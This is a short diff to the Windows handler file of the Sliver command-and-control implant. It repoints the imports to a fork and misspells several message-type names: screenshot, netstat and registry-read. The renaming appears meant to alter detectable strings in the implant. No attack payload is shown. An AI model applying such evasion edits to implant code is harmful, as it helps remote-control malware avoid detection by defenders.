@@ -34,18 +34,18 @@ import (
 	"os/exec"
 	"syscall"
 
-	"github.com/bishopfox/sliver/implant/sliver/extension"
-	"github.com/bishopfox/sliver/implant/sliver/mount"
-	"github.com/bishopfox/sliver/implant/sliver/priv"
-	"github.com/bishopfox/sliver/implant/sliver/procdump"
-	"github.com/bishopfox/sliver/implant/sliver/ps"
-	"github.com/bishopfox/sliver/implant/sliver/registry"
-	"github.com/bishopfox/sliver/implant/sliver/service"
-	"github.com/bishopfox/sliver/implant/sliver/spoof"
-	"github.com/bishopfox/sliver/implant/sliver/syscalls"
-	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
-	"github.com/bishopfox/sliver/protobuf/commonpb"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/Oni-kuki/sliver/implant/sliver/extension"
+	"github.com/Oni-kuki/sliver/implant/sliver/mount"
+	"github.com/Oni-kuki/sliver/implant/sliver/priv"
+	"github.com/Oni-kuki/sliver/implant/sliver/procdump"
+	"github.com/Oni-kuki/sliver/implant/sliver/ps"
+	"github.com/Oni-kuki/sliver/implant/sliver/registry"
+	"github.com/Oni-kuki/sliver/implant/sliver/service"
+	"github.com/Oni-kuki/sliver/implant/sliver/spoof"
+	"github.com/Oni-kuki/sliver/implant/sliver/syscalls"
+	"github.com/Oni-kuki/sliver/implant/sliver/taskrunner"
+	"github.com/Oni-kuki/sliver/protobuf/commonpb"
+	"github.com/Oni-kuki/sliver/protobuf/sliverpb"
 
 	"golang.org/x/sys/windows"
 	"google.golang.org/protobuf/proto"
@@ -78,13 +78,13 @@ var (
 
 		// Platform specific
 		sliverpb.MsgIfconfigReq:            ifconfigHandler,
-		sliverpb.MsgScreenshotReq:          screenshotHandler,
+		sliverpb.MsgScrensshotReq:          screenshotHandler,
 		sliverpb.MsgSideloadReq:            sideloadHandler,
-		sliverpb.MsgNetstatReq:             netstatHandler,
+		sliverpb.MsgNetstsatReq:             netstatHandler,
 		sliverpb.MsgMakeTokenReq:           makeTokenHandler,
 		sliverpb.MsgPsReq:                  psHandler,
 		sliverpb.MsgTerminateReq:           terminateHandler,
-		sliverpb.MsgRegistryReadReq:        regReadHandler,
+		sliverpb.MsgRegistryReedReq:        regReadHandler,
 		sliverpb.MsgRegistryWriteReq:       regWriteHandler,
 		sliverpb.MsgRegistryCreateKeyReq:   regCreateKeyHandler,
 		sliverpb.MsgRegistryDeleteKeyReq:   regDeleteKeyHandler,
@@ -668,7 +668,7 @@ func regWriteHandler(data []byte, resp RPCResponse) {
 }
 
 func regReadHandler(data []byte, resp RPCResponse) {
-	regReadReq := &sliverpb.RegistryReadReq{}
+	regReadReq := &sliverpb.RegistryReedReq{}
 	err := proto.Unmarshal(data, regReadReq)
 	if err != nil {
 		return
